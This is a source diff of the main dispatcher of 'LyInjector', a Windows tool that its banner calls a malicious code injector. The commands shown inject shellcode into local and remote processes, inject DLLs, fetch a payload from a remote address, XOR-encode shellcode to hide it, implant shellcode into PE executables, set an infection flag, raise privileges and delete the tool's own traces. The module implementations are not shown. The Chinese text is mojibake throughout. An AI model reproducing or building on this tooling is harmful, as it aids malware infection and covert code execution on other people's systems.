@@ -1,4 +1,4 @@
-// LyInjector.cpp : ¶¨Òå¿ØÖÆÌ¨Ó¦ÓÃ³ÌĞòµÄÈë¿Úµã¡£
+// LyInjector.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚
 //
 
 #include "stdafx.h"
@@ -17,233 +17,289 @@
 
 int _tmain(int argc, _TCHAR* argv[])
 {
-	if (argc == 1)
-	{
-		fprintf(stderr,
-			" _            ___        _           _             \n"
-			"| |   _   _  |_ _|_ __  (_) ___  ___| |_ ___  _ __ \n"
-			"| |  | | | |  | || '_ \\ | |/ _ \\/ __| __/ _ \\| '__|\n"
-			"| |__| |_| |  | || | | || |  __/ (__| || (_) | |   \n"
-			"|_____\\__, | |___|_| |_|/ |\\___|\\___|\\__\\___/|_|   \n"
-			"      |___/           |__/                         \n\n"
-			"---------------------------------------------------------- \n"
-			"[*] Ó¦ÓÃ²ã¶ñÒâ´úÂë×¢ÈëÆ÷ \n"
-			"[+] °æ±¾: 2.0.0 \n"
-			"[+] ÁªÏµ×÷Õß: me@lyshark.com \n"
-			"---------------------------------------------------------- \n\n"
-			"  [+] »ù´¡¹¦ÄÜ\n\n"
-			"\t Show              ÏÔÊ¾µ±Ç°ËùÓĞ¿É×¢Èë½ø³Ì \n"
-			"\t ShowDll           ÏÔÊ¾½ø³ÌÄÚµÄËùÓĞDLLÄ£¿é \n"
-			"\t Promote           ³¢ÊÔÌáÉı×ÔÉí½ø³ÌÈ¨ÏŞ \n"
-			"\t FreeDll           ³¢ÊÔĞ¶ÔØÖ¸¶¨½ø³ÌÄÚµÄDLLÄ£¿é \n"
-			"\t GetFuncAddr       ÏÔÊ¾½ø³ÌÄÚÌØ¶¨Ä£¿éÄÚº¯Êı»ùÖ· \n"
-			"\t Delself           ´ÓÏµÍ³ÖĞÉ¾³ı×ÔÉíºÛ¼£ \n\n"
-			"  [+] ¸ñÊ½»¯¹¦ÄÜ\n\n"
-			"\t Format            ½«×Ö½ÚÊı×é¸ñÊ½»¯ÎªÒ»ĞĞ²¢´òÓ¡ \n"
-			"\t FormatFile        ½«×Ö½ÚÊı×é¸ñÊ½»¯²¢Ğ´³öµ½ÎÄ¼ş \n"
-			"\t Xor               ½«ÎÄ±¾ÖĞÑ¹ËõºóµÄ×Ö½ÚÊı×é½øĞĞÒì»ò²¢Êä³ö \n"
-			"\t Xchg              ½«Ñ¹ËõºóµÄ×Ö·û´®×ªÎª×Ö½ÚÊı×é¸ñÊ½ \n"
-			"\t XorArray          ½«×Ö½ÚÊı×é¼ÓÃÜ/½âÃÜÎª×Ö½ÚÊı×é¸ñÊ½ \n\n"
-			"  [+] ½ø³Ì×¢Èë¹¦ÄÜ\n\n"
-			"\t InjectDLL         ×¢ÈëDLLÄ£¿éµ½ÌØ¶¨½ø³ÌÄÚ \n"
-			"\t InjectSelfShell   ×¢Èë×Ö·û´®µ½×ÔÉí½ø³Ì²¢ÔËĞĞ \n"
-			"\t InjectArrayByte   ×¢Èë×Ö½ÚÊı×éµ½×ÔÉí½ø³Ì²¢ÔËĞĞ \n"
-			"\t FileInjectShell   ´ÓÎÄ¼şÖĞ¶ÁÈë×Ö·û´®²¢×¢ÈëÔËĞĞ \n"
-			"\t InjectProcShell   ×¢Èë×Ö·û´®µ½Ô¶³Ì½ø³Ì²¢ÔËĞĞ \n"
-			"\t InjectWebShell    ´ÓÔ¶³Ì¼ÓÔØ×Ö·û´®²¢×¢Èë×ÔÉí½ø³Ì \n"
-			"\t AddSection        ÔÚPEÎÄ¼şÖĞĞÂÔöÒ»¸ö½ÚÇø \n"
-			"\t InsertShellCode   ½«ShellCode²åÈëµ½PEÖĞµÄÖ¸¶¨Î»ÖÃ´¦ \n"
-			"\t RepairShellOep    ÔÚShellCodeÄ©Î²Ôö¼ÓÌø×ª»ØÔ­´¦µÄÖ¸Áî \n"
-			"\t SetSigFlag        ÉèÖÃÎÄ¼ş¸ĞÈ¾±êÖ¾ \n\n"
-			"  [+] ±àÂëÆ÷\n\n"
-			"\t EncodeInFile      ´ÓÎÄ¼ş¶ÁÈë¼ÓÃÜ×Ö·û´®²¢Ö´ĞĞ·´µ¯ \n"
-			"\t EncodePidInFile   ×¢Èë¼ÓÃÜºóµÄ×Ö·û´®µ½Ô¶³Ì½ø³ÌÖĞ \n\n"
-			);
-	}
-	if (argc == 2)
-	{
-		if (strcmp(argv[1], "Show") == 0)
-		{
-			ShellCodeInjectModule::EnumProcess();
-		}
-		if (strcmp(argv[1], "Promote") == 0)
-		{
-			if (ShellCodeInjectModule::IncreaseSelfAuthority() == FALSE)
-			{
-				printf("[-] È¨ÏŞÌáÉıÊ§°Ü. \n");
-			}
-			else
-			{
-				printf("[*] ÒÑÌáÉı. \n");
-			}
-		}
-		if (strcmp(argv[1], "Delself") == 0)
-		{
-			if (ShellCodeInjectModule::SelfDel() == TRUE)
-			{
-				printf("[*] ×ÔÉíÒÑÇå³ı. \n");
-			}
-			else
-			{
-				printf("[-] É¾³ıÊ§°Ü. \n");
-			}
-		}
-	}
-	if (argc == 4)
-	{
-		if ((strcmp(argv[1], "Format") == 0) && (strcmp(argv[2], "--path") == 0))
-		{
-			ShellCodeInjectModule::Compressed(argv[3]);
-		}
-		if ((strcmp(argv[1], "InjectSelfShell") == 0) && (strcmp(argv[2], "--shellcode") == 0))
-		{
-			ShellCodeInjectModule::InjectSelfCode(argv[3]);
-		}
-		if ((strcmp(argv[1], "InjectArrayByte") == 0) && (strcmp(argv[2], "--path") == 0))
-		{
-			ShellCodeInjectModule::CompressedOnFormat(argv[3]);
-		}
-		if ((strcmp(argv[1], "FileInjectShell") == 0) && (strcmp(argv[2], "--path") == 0))
-		{
-			ShellCodeInjectModule::ReadShellCodeOnMemory(argv[3]);
-		}
-		if (strcmp((char*)argv[1], "ShowDll") == 0 && strcmp((char*)argv[2], "--proc") == 0)
-		{
-			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
-			if (pid != 0xFFFFFFFF)
-			{
-				printf("\n");
-				DllInjectModule::ShowProcessDllName(pid);
-			}
-			else
-			{
-				printf("[+] ÇëÖ¸¶¨Ò»¸öÕıÔÚÔËĞĞµÄ½ø³Ì \n");
-				return 0;
-			}
-		}
-		if (argc == 4)
-		{
-			if (strcmp((char*)argv[1], "SetSigFlag") == 0 && strcmp((char*)argv[2], "--path") == 0)
-			{
-				PEInjectModule::SetSigFlag(argv[3]);
-			}
-		}
-	}
-	if (argc == 6)
-	{
-		if ((strcmp(argv[1], "FormatFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--output") == 0))
-		{
-			ShellCodeInjectModule::CompressedToFile(argv[3], argv[5]);
-		}
-		if ((strcmp(argv[1], "Xor") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
-		{
-			ShellCodeInjectModule::XorShellCode(argv[3], argv[5]);
-		}
-		if ((strcmp(argv[1], "Xchg") == 0) && (strcmp(argv[2], "--input") == 0) && (strcmp(argv[4], "--output") == 0))
-		{
-			ShellCodeInjectModule::XchgShellCode(argv[3], argv[5]);
-		}
-		if ((strcmp(argv[1], "XorArray") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
-		{
-			ShellCodeInjectModule::XorEncodeDeCode(argv[3], argv[5]);
-		}
-		if ((strcmp(argv[1], "InjectProcShell") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--shellcode") == 0))
-		{
-			ShellCodeInjectModule::InjectCode(atoi(argv[3]), argv[5]);
-		}
-		if ((strcmp(argv[1], "InjectWebShell") == 0) && (strcmp(argv[2], "--address") == 0) && (strcmp(argv[4], "--payload") == 0))
-		{
-			ShellCodeInjectModule::WebPageBounceShellCode(argv[3], argv[5]);
-		}
-		if ((strcmp(argv[1], "EncodeInFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
-		{
-			ShellCodeInjectModule::ReadXorShellCodeOnMemory(argv[3], argv[5]);
-		}
-		if (strcmp((char*)argv[1], "InjectDLL") == 0 && strcmp((char*)argv[2], "--proc") == 0 && strcmp((char*)argv[4], "--dll") == 0)
-		{
-			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
-			if (pid != 0xFFFFFFFF)
-			{
-				BOOL flag = DllInjectModule::RemoteProcessInject(pid, argv[5]);
-				if (flag == TRUE)
-				{
-					printf("[*] Ä£¿é [ %s ] ÒÑ±»×¢Èëµ½ [ %d ] ½ø³Ì \n", argv[5], pid);
-				}
-				else
-				{
-					printf("[-] Ä£¿é×¢ÈëÊ§°Ü \n");
-				}
-			}
-			else
-			{
-				printf("[+] ÇëÖ¸¶¨Ò»¸öÕıÔÚÔËĞĞµÄ½ø³Ì \n");
-				return 0;
-			}
-		}
-		if (strcmp((char*)argv[1], "FreeDll") == 0 && strcmp((char*)argv[2], "--proc") == 0 && strcmp((char*)argv[4], "--dll") == 0)
-		{
-			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
-			if (pid != 0xFFFFFFFF)
-			{
-				printf("\n");
-				BOOL ref = DllInjectModule::FreeProcessDll(pid, argv[5]);
-				printf("[*] Ä£¿éĞ¶ÔØ×´Ì¬: %d \n", ref);
-			}
-			else
-			{
-				printf("[+] ÇëÖ¸¶¨Ò»¸öÕıÔÚÔËĞĞµÄ½ø³Ì \n");
-				return 0;
-			}
-		}
-	}
-	if (argc == 8)
-	{
-		if ((strcmp(argv[1], "EncodePidInFile") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--path") == 0) && (strcmp(argv[6], "--passwd") == 0))
-		{
-			ShellCodeInjectModule::InjectXorCode(atoi(argv[3]), argv[5], argv[7]);
-		}
-		if (strcmp((char*)argv[1], "GetFuncAddr") == 0 && strcmp((char*)argv[2], "--proc") == 0 &&
-			strcmp((char*)argv[4], "--dll") == 0 && strcmp((char*)argv[6], "--func") == 0
-			)
-		{
-			DWORD pid = DllInjectModule::FindProcessID(argv[3]);
-			if (pid != 0xFFFFFFFF)
-			{
-				printf("\n");
-				DllInjectModule::GetProcessDllFunctionAddress(pid, argv[5], argv[7]);
-			}
-			else
-			{
-				printf("[+] ÇëÖ¸¶¨Ò»¸öÕıÔÚÔËĞĞµÄ½ø³Ì \n");
-				return 0;
-			}
-		}
-		if (strcmp((char*)argv[1], "AddSection") == 0
-			&& strcmp((char*)argv[2], "--path") == 0
-			&& strcmp((char*)argv[4], "--section") == 0
-			&& strcmp((char*)argv[6], "--size") == 0
-			)
-		{
-			PEInjectModule::ImplantSection(argv[3], argv[5], atoi(argv[7]));
-			Sleep(1000);
-			PEInjectModule::AllocateSpace(argv[3], atoi(argv[7]));
-		}
-		if (strcmp((char*)argv[1], "InsertShellCode") == 0
-			&& strcmp((char*)argv[2], "--path") == 0
-			&& strcmp((char*)argv[4], "--shellcode") == 0
-			&& strcmp((char*)argv[6], "--offset") == 0
-			)
-		{
-			PEInjectModule::WritePEShellCode(argv[3], atoi(argv[7]), argv[5]);
-		}
-		if (strcmp((char*)argv[1], "RepairShellOep") == 0
-			&& strcmp((char*)argv[2], "--path") == 0
-			&& strcmp((char*)argv[4], "--start_offset") == 0
-			&& strcmp((char*)argv[6], "--end_offset") == 0
-			)
-		{
-			PEInjectModule::SetPeJmpHeader((char*)argv[3], atoi(argv[5]), atoi(argv[7]));
-		}
-	}
-	return 0;
+    if (argc == 1)
+    {
+        fprintf(stderr,
+            " _            ___        _           _             \n"
+            "| |   _   _  |_ _|_ __  (_) ___  ___| |_ ___  _ __ \n"
+            "| |  | | | |  | || '_ \\ | |/ _ \\/ __| __/ _ \\| '__|\n"
+            "| |__| |_| |  | || | | || |  __/ (__| || (_) | |   \n"
+            "|_____\\__, | |___|_| |_|/ |\\___|\\___|\\__\\___/|_|   \n"
+            "      |___/           |__/                         \n\n"
+            "---------------------------------------------------------- \n"
+            "[*] åº”ç”¨å±‚æ¶æ„ä»£ç æ³¨å…¥å™¨ \n"
+            "[+] ç‰ˆæœ¬: 2.0.0 \n"
+            "[+] è”ç³»ä½œè€…: me@lyshark.com \n"
+            "---------------------------------------------------------- \n\n"
+            "  [+] åŸºç¡€åŠŸèƒ½\n\n"
+            "\t Show              æ˜¾ç¤ºå½“å‰æ‰€æœ‰å¯æ³¨å…¥è¿›ç¨‹ \n"
+            "\t ShowDll           æ˜¾ç¤ºè¿›ç¨‹å†…çš„æ‰€æœ‰DLLæ¨¡å— \n"
+            "\t Promote           å°è¯•æå‡è‡ªèº«è¿›ç¨‹æƒé™ \n"
+            "\t FreeDll           å°è¯•å¸è½½æŒ‡å®šè¿›ç¨‹å†…çš„DLLæ¨¡å— \n"
+            "\t GetFuncAddr       æ˜¾ç¤ºè¿›ç¨‹å†…ç‰¹å®šæ¨¡å—å†…å‡½æ•°åŸºå€ \n"
+            "\t Delself           ä»ç³»ç»Ÿä¸­åˆ é™¤è‡ªèº«ç—•è¿¹ \n\n"
+
+            "  [+] æ ¼å¼åŒ–åŠŸèƒ½\n\n"
+            "\t Format            å°†å­—èŠ‚æ•°ç»„æ ¼å¼åŒ–ä¸ºä¸€è¡Œå¹¶æ‰“å° \n"
+            "\t FormatFile        å°†å­—èŠ‚æ•°ç»„æ ¼å¼åŒ–å¹¶å†™å‡ºåˆ°æ–‡ä»¶ \n"
+            "\t Xor               å°†æ–‡æœ¬ä¸­å‹ç¼©åçš„å­—èŠ‚æ•°ç»„è¿›è¡Œå¼‚æˆ–å¹¶è¾“å‡º \n"
+            "\t Xchg              å°†å‹ç¼©åçš„å­—ç¬¦ä¸²è½¬ä¸ºå­—èŠ‚æ•°ç»„æ ¼å¼ \n"
+            "\t XorArray          å°†å­—èŠ‚æ•°ç»„åŠ å¯†/è§£å¯†ä¸ºå­—èŠ‚æ•°ç»„æ ¼å¼ \n\n"
+
+            "  [+] è¿›ç¨‹æ³¨å…¥åŠŸèƒ½\n\n"
+            "\t InjectDLL         æ³¨å…¥DLLæ¨¡å—åˆ°ç‰¹å®šè¿›ç¨‹å†… \n"
+            "\t InjectSelfShell   æ³¨å…¥å­—ç¬¦ä¸²åˆ°è‡ªèº«è¿›ç¨‹å¹¶è¿è¡Œ \n"
+            "\t InjectArrayByte   æ³¨å…¥å­—èŠ‚æ•°ç»„åˆ°è‡ªèº«è¿›ç¨‹å¹¶è¿è¡Œ \n"
+            "\t FileInjectShell   ä»æ–‡ä»¶ä¸­è¯»å…¥å­—ç¬¦ä¸²å¹¶æ³¨å…¥è¿è¡Œ \n"
+            "\t InjectProcShell   æ³¨å…¥å­—ç¬¦ä¸²åˆ°è¿œç¨‹è¿›ç¨‹å¹¶è¿è¡Œ \n"
+            "\t InjectWebShell    ä»è¿œç¨‹åŠ è½½å­—ç¬¦ä¸²å¹¶æ³¨å…¥è‡ªèº«è¿›ç¨‹ \n"
+            "\t AddSection        åœ¨PEæ–‡ä»¶ä¸­æ–°å¢ä¸€ä¸ªèŠ‚åŒº \n"
+            "\t InsertShellCode   å°†ShellCodeæ’å…¥åˆ°PEä¸­çš„æŒ‡å®šä½ç½®å¤„ \n"
+            "\t RepairShellOep    åœ¨ShellCodeæœ«å°¾å¢åŠ è·³è½¬å›åŸå¤„çš„æŒ‡ä»¤ \n"
+            "\t SetSigFlag        è®¾ç½®æ–‡ä»¶æ„ŸæŸ“æ ‡å¿— \n\n"
+
+            "  [+] ç¼–ç å™¨\n\n"
+            "\t EncodeInFile      ä»æ–‡ä»¶è¯»å…¥åŠ å¯†å­—ç¬¦ä¸²å¹¶æ‰§è¡Œåå¼¹ \n"
+            "\t EncodePidInFile   æ³¨å…¥åŠ å¯†åçš„å­—ç¬¦ä¸²åˆ°è¿œç¨‹è¿›ç¨‹ä¸­ \n\n"
+            );
+    }
+
+    // -----------------------------------------------------------------------
+    // ä¼ é€’ä¸€ä¸ªå‚æ•°
+    // -----------------------------------------------------------------------
+    if (argc == 2)
+    {
+        // è¾“å‡ºå½“å‰è¿›ç¨‹åˆ—è¡¨
+        // --show
+        if (strcmp(argv[1], "Show") == 0)
+        {
+            ShellCodeInjectModule::EnumProcess();
+        }
+        // æå‡è‡ªèº«æƒé™
+        if (strcmp(argv[1], "Promote") == 0)
+        {
+            if (ShellCodeInjectModule::IncreaseSelfAuthority() == FALSE)
+            {
+                printf("[-] æƒé™æå‡å¤±è´¥. \n");
+            }
+            else
+            {
+                printf("[*] å·²æå‡. \n");
+            }
+        }
+        // åˆ é™¤è‡ªèº«è¿›ç¨‹
+        if (strcmp(argv[1], "Delself") == 0)
+        {
+            if (ShellCodeInjectModule::SelfDel() == TRUE)
+            {
+                printf("[*] è‡ªèº«å·²æ¸…é™¤. \n");
+            }
+            else
+            {
+                printf("[-] åˆ é™¤å¤±è´¥. \n");
+            }
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // ä¼ é€’ä¸‰ä¸ªå‚æ•°
+    // -----------------------------------------------------------------------
+    if (argc == 4)
+    {
+        // æ ¼å¼åŒ–ä¸ºä¸€è¡Œ Format --path d://shellcode.txt
+        if ((strcmp(argv[1], "Format") == 0) && (strcmp(argv[2], "--path") == 0))
+        {
+            ShellCodeInjectModule::Compressed(argv[3]);
+        }
+        // æ³¨å…¥åˆ°è‡ªèº«è¿›ç¨‹å¹¶è¿è¡Œ InjectSelfShell --shellcode 0fce8bec8844abec....
+        if ((strcmp(argv[1], "InjectSelfShell") == 0) && (strcmp(argv[2], "--shellcode") == 0))
+        {
+            ShellCodeInjectModule::InjectSelfCode(argv[3]);
+        }
+        // ç›´æ¥æ³¨å…¥æ–‡ä»¶ä¸­çš„å­—èŠ‚æ•°ç»„ InjectArrayByte --path d://shellcode.txt
+        if ((strcmp(argv[1], "InjectArrayByte") == 0) && (strcmp(argv[2], "--path") == 0))
+        {
+            ShellCodeInjectModule::CompressedOnFormat(argv[3]);
+        }
+        // ä»æ–‡ä»¶ä¸­è¯»å…¥å­—ç¬¦ä¸²å¹¶æ³¨å…¥ FileInjectShell --path d://shellcode.txt
+        if ((strcmp(argv[1], "FileInjectShell") == 0) && (strcmp(argv[2], "--path") == 0))
+        {
+            ShellCodeInjectModule::ReadShellCodeOnMemory(argv[3]);
+        }
+
+        // æ˜¾ç¤ºå½“å‰è¿›ç¨‹ä¸­å¯¼å…¥çš„æ‰€æœ‰DLLæ¨¡å— ShowDll --proc x64.exe
+        if (strcmp((char*)argv[1], "ShowDll") == 0 && strcmp((char*)argv[2], "--proc") == 0)
+        {
+            DWORD pid = DllInjectModule::FindProcessID(argv[3]);
+            if (pid != 0xFFFFFFFF)
+            {
+                printf("\n");
+                DllInjectModule::ShowProcessDllName(pid);
+            }
+            else
+            {
+                printf("[+] è¯·æŒ‡å®šä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ \n");
+                return 0;
+            }
+        }
+
+        // è®¾ç½®æ„ŸæŸ“æ ‡å¿—ï¼šSetSigFlag --path d://aaa.exe
+        if (argc == 4)
+        {
+            if (strcmp((char*)argv[1], "SetSigFlag") == 0 && strcmp((char*)argv[2], "--path") == 0)
+            {
+                PEInjectModule::SetSigFlag(argv[3]);
+            }
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // ä¼ é€’äº”ä¸ªå‚æ•°
+    // -----------------------------------------------------------------------
+    if (argc == 6)
+    {
+        // æ ¼å¼åŒ–ä¿å­˜ä¸ºæ–‡ä»¶ FormatFile --path d://shellcode.txt --output d://encode.txt
+        if ((strcmp(argv[1], "FormatFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--output") == 0))
+        {
+            ShellCodeInjectModule::CompressedToFile(argv[3], argv[5]);
+        }
+        // å¼‚æˆ–åŠ å¯†/è§£å¯† Xor --path d://shellcode.txt --passwd lyshark
+        if ((strcmp(argv[1], "Xor") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
+        {
+            ShellCodeInjectModule::XorShellCode(argv[3], argv[5]);
+        }
+        // å­—ç¬¦ä¸²è½¬å­—èŠ‚æ•°ç»„ Xchg --input d://encode.txt --output d://array.txt
+        if ((strcmp(argv[1], "Xchg") == 0) && (strcmp(argv[2], "--input") == 0) && (strcmp(argv[4], "--output") == 0))
+        {
+            ShellCodeInjectModule::XchgShellCode(argv[3], argv[5]);
+        }
+        // å­—èŠ‚æ•°ç»„åŠ å¯†ä¸ºå­—èŠ‚æ•°ç»„ XorArray --path d://array.txt --passwd lyshark
+        if ((strcmp(argv[1], "XorArray") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
+        {
+            ShellCodeInjectModule::XorEncodeDeCode(argv[3], argv[5]);
+        }
+
+        // å°†å­—ç¬¦ä¸²æ³¨å…¥åˆ°è¿œç¨‹è¿›ç¨‹ InjectProcShell --pid 1021 --shellcode 0fce8bec8844abec....
+        if ((strcmp(argv[1], "InjectProcShell") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--shellcode") == 0))
+        {
+            ShellCodeInjectModule::InjectCode(atoi(argv[3]), argv[5]);
+        }
+        // ä»è¿œç¨‹åŠ è½½å¹¶æ³¨å…¥å­—ç¬¦ä¸² InjectWebShell --address 192.168.1.1 --payload shellcode.raw
+        if ((strcmp(argv[1], "InjectWebShell") == 0) && (strcmp(argv[2], "--address") == 0) && (strcmp(argv[4], "--payload") == 0))
+        {
+            ShellCodeInjectModule::WebPageBounceShellCode(argv[3], argv[5]);
+        }
+        // åŠ å¯†åå¼¹ EncodeInFile --path d://shellcode.txt --passwd lyshark
+        if ((strcmp(argv[1], "EncodeInFile") == 0) && (strcmp(argv[2], "--path") == 0) && (strcmp(argv[4], "--passwd") == 0))
+        {
+            ShellCodeInjectModule::ReadXorShellCodeOnMemory(argv[3], argv[5]);
+        }
+
+        // æ³¨å…¥DLLåˆ°æŒ‡å®šè¿›ç¨‹ InjectDLL --proc x32.exe --dll d://test.dll
+        if (strcmp((char*)argv[1], "InjectDLL") == 0 && strcmp((char*)argv[2], "--proc") == 0 && strcmp((char*)argv[4], "--dll") == 0)
+        {
+            DWORD pid = DllInjectModule::FindProcessID(argv[3]);
+            if (pid != 0xFFFFFFFF)
+            {
+                BOOL flag = DllInjectModule::RemoteProcessInject(pid, argv[5]);
+                if (flag == TRUE)
+                {
+                    printf("[*] æ¨¡å— [ %s ] å·²è¢«æ³¨å…¥åˆ° [ %d ] è¿›ç¨‹ \n", argv[5], pid);
+                }
+                else
+                {
+                    printf("[-] æ¨¡å—æ³¨å…¥å¤±è´¥ \n");
+                }
+            }
+            else
+            {
+                printf("[+] è¯·æŒ‡å®šä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ \n");
+                return 0;
+            }
+        }
+
+        // å¸è½½è¿›ç¨‹å†…çš„DLLæ¨¡å—
+        if (strcmp((char*)argv[1], "FreeDll") == 0 && strcmp((char*)argv[2], "--proc") == 0 && strcmp((char*)argv[4],"--dll") == 0)
+        {
+            DWORD pid = DllInjectModule::FindProcessID(argv[3]);
+            if (pid != 0xFFFFFFFF)
+            {
+                printf("\n");
+                BOOL ref = DllInjectModule::FreeProcessDll(pid, argv[5]);
+                printf("[*] æ¨¡å—å¸è½½çŠ¶æ€: %d \n", ref);
+
+            }
+            else
+            {
+                printf("[+] è¯·æŒ‡å®šä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ \n");
+                return 0;
+            }
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // ä¼ é€’ä¸ƒä¸ªå‚æ•°
+    // -----------------------------------------------------------------------
+    if (argc == 8)
+    {
+        // åŠ å¯†åå¼¹ InjectXorCode --pid 1022 --path d://shellcode.txt --passwd lyshark
+        if ((strcmp(argv[1], "EncodePidInFile") == 0) && (strcmp(argv[2], "--pid") == 0) && (strcmp(argv[4], "--path") == 0) && (strcmp(argv[6], "--passwd") == 0))
+        {
+            ShellCodeInjectModule::InjectXorCode(atoi(argv[3]), argv[5], argv[7]);
+        }
+
+        // è·å–è¿›ç¨‹å†…å¯¼å‡ºå‡½æ•°åœ°å€ GetFuncAddr --proc x32.exe --dll user32.dll --func messagebox
+        if (strcmp((char*)argv[1], "GetFuncAddr") == 0 && strcmp((char*)argv[2], "--proc") == 0 &&
+            strcmp((char*)argv[4], "--dll") == 0 && strcmp((char*)argv[6], "--func") == 0
+            )
+        {
+            DWORD pid = DllInjectModule::FindProcessID(argv[3]);
+            if (pid != 0xFFFFFFFF)
+            {
+                printf("\n");
+                DllInjectModule::GetProcessDllFunctionAddress(pid, argv[5], argv[7]);
+            }
+            else
+            {
+                printf("[+] è¯·æŒ‡å®šä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ \n");
+                return 0;
+            }
+        }
+
+        // åœ¨PEæ–‡ä»¶ä¸­æ–°å¢ä¸€ä¸ªèŠ‚ Error
+        // AddSection --path d://aaa.exe --section .hack --size 4096
+        if (strcmp((char*)argv[1], "AddSection") == 0
+            && strcmp((char*)argv[2], "--path") == 0
+            && strcmp((char*)argv[4], "--section") == 0
+            && strcmp((char*)argv[6], "--size") == 0
+            )
+        {
+            PEInjectModule::ImplantSection(argv[3], argv[5], atoi(argv[7]));
+            Sleep(1000);
+            PEInjectModule::AllocateSpace(argv[3], atoi(argv[7]));
+        }
+
+        // å°†ShellCodeæ’å…¥åˆ°PEä¸­çš„æŒ‡å®šä½ç½®
+        // InsertShellCode --path d://aaa.exe --shellcode d://shellcode.txt --offset 7102
+        if (strcmp((char*)argv[1], "InsertShellCode") == 0
+            && strcmp((char*)argv[2], "--path") == 0
+            && strcmp((char*)argv[4], "--shellcode") == 0
+            && strcmp((char*)argv[6], "--offset") == 0
+            )
+        {
+            PEInjectModule::WritePEShellCode(argv[3], atoi(argv[7]), argv[5]);
+        }
+
+        // åœ¨ShellCodeæœ«å°¾å¢åŠ è·³è½¬å›åŸå¤„çš„æŒ‡ä»¤ Error
+        // RepairShellOep --path d://aaa.exe --start_offset 28492 --end_offset 28498
+        if (strcmp((char*)argv[1], "RepairShellOep") == 0
+            && strcmp((char*)argv[2], "--path") == 0
+            && strcmp((char*)argv[4], "--start_offset") == 0
+            && strcmp((char*)argv[6], "--end_offset") == 0
+            )
+        {
+            PEInjectModule::SetPeJmpHeader((char*)argv[3], atoi(argv[5]), atoi(argv[7]));
+        }
+    }
+    return 0;
 }
